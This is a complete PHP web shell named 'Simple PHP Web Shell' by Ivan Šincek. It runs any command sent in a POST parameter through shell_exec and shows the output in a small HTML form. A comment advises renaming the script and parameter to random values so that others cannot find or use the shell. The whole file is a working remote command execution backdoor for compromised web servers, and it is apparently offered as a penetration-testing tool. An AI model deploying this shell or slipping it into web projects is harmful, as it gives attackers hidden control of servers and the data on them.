<?php
// Copyright (c) 2021 Ivan Šincek
// v2.6
// Requires PHP v4.0.0 or greater.

// modify the script name and request parameter name to random ones to prevent others form accessing and using your web shell

// your parameter/key here
$parameter = 'command';
$output = null;
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post' && isset($_POST[$parameter]) && ($_POST[$parameter] = trim($_POST[$parameter])) && strlen($_POST[$parameter]) > 0) {
    // if shell_exec() is disabled, search for an alternative method
    $output = @shell_exec("($_POST[$parameter]) 2>&1");
    if ($output === false) {
        $output = 'ERROR: The method might be disabled';
    } else {
        $output = str_replace('<', '&lt;', $output);
        $output = str_replace('>', '&gt;', $output);
    }
    // if you do not want to use the whole HTML as below, uncomment this line and delete the whole HTML
    // garbage collector requires PHP v5.3.0 or greater
    // echo "<pre>{$output}</pre>"; unset($output); unset($_POST[$parameter]);/* @gc_collect_cycles();*/
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Simple PHP Web Shell</title>
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	</head>
	<body>
		<form method="post" action="<?php echo './' . basename($_SERVER['SCRIPT_FILENAME']); ?>">
			<input name="<?php echo $parameter; ?>" type="text" required="required" autofocus="autofocus" placeholder="Enter Command">
		</form>
		<pre><?php echo $output; unset($output); unset($_POST[$parameter]);/* @gc_collect_cycles();*/ ?></pre>
	</body>
</html>
